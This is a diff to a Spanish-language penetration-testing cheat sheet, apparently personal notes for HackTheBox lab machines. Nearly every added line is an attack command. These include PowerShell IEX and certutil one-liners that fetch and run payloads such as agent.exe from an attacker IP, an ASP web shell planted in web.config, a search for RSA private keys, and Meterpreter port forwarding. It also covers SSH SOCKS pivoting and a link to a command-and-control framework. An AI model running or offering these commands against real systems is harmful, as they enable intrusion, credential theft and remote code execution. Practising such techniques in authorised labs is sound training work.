@@ -132,8 +132,11 @@ ssh -i root.key -L9000:10.10.10.75:80 10.10.10.73
 L9000: Puerto local a publicar
 10.10.10.75:80: IP y puerto remoto a consultar
 10.10.10.73 Servidor mediante el cual se realizará la salida.
-
 Al final en el navegador se consultará como http://localhost:9000
+
+redirect desde windows a kali el tráfico
+conectarse a kali, desde puty con ssh -D8091 kali@192.168.0.5
+Después desde burpsuite en windows, en user options, poner el socket: 127.0.0.1 8091, nota: no responde PING, todas las consultas son resueltas a traves de burpsuite.
 ****************************************************Oracle***************************************************
 https://github.com/quentinhardy/odat
 Con el programa odat se puede realizar una enumeración del objetivo
@@ -150,8 +153,23 @@ sqlplus scott/tiger@10.10.10.82:1521/XE
 NOTA: La máquina de HTB Silo, describe muy bien el procedimiento
 https://www.youtube.com/watch?v=2c7SzNo9uoA&feature=emb_title
 
-*************************************Buscar archivos con private key********************
+*************************************Buscar archivos ********************
+private key
  find / -xdev -type f -print0 | xargs -0 grep -H "BEGIN RSA PRIVATE KEY"
+ 
+buscar archivos ejecutables windows 
+attrib *.* -h -s /h /s
+Buscar flag en windows
+C:\>dir /b/s *.txt
+
+buscar archivos en meterpreter
+search -d / -f "*.txt"
+search -f *.txt
+
+Buscar root.txt linux
+find . -name *root.txt -exec wc -c {} \;
+find / -iname *.txt
+
  **********************************monitorear crontabs
  ./pspy64
  ***********************************iptables***************************
@@ -159,6 +177,41 @@ https://www.youtube.com/watch?v=2c7SzNo9uoA&feature=emb_title
 iptables -A INPUT -p tcp --dport 22 -j REJECT
 netfilter-persistent save
 netfilter-persistent reload
+
+*********************************PortFowd- meterpreter
+portfwd add -l 445 -r 127.0.0.1 -p 445
+*********************************merlin
+https://www.hackingarticles.in/command-and-control-guide-to-merlin/
+********************************Descargar archivos******************
+windows
+Cuando se está usando lenguaje .net y se está lanzando comandos desde burpsuite
+
+cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/file.txt')
+cmd /c certutil -urlcache -split -f http://10.10.14.27/agent.exe C:\\users\\public\\agent.exe")
+
+desde cmd windows
+certutil -urlcache -split -f http://10.10.14.27/agent.exe agent.exe
+
+desde linux 
+wget http://10.10.14.27/agent.exe
+curl 10.10.14.27/agent.exe -o agent.exe
+
+desde una conexión en reversa
+powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/file.txt')
+**********************************************websell asp web.config*******************************************
+Se agrega esto a la línea del web config https://github.com/diegoexploit/HackTheBox/blob/master/web.config
+Se pueden ir cambiando los comandos que están dentro de las comillas, incluso se puede agregar powershell, siempre con cmd /c
+Máquina de referencia Bounty
+<%
+Set rs = CreateObject("WScript.Shell")
+Set cmd = rs.Exec("cmd /c dir C:\users\public")
+o = cmd.StdOut.Readall()
+Response.write(o)
+%>
+
+*************************************Analizador de vulnerabilidades interno con sherlock
+Se pone el archivo en kali y se lanza con este comando para que descargue y haga el análisis.
+echo iex (New-Object Net.WebClient).DownloadString("http://10.10.14.27/Sherlock.ps1") | powershell -noprofile -
 
 
 
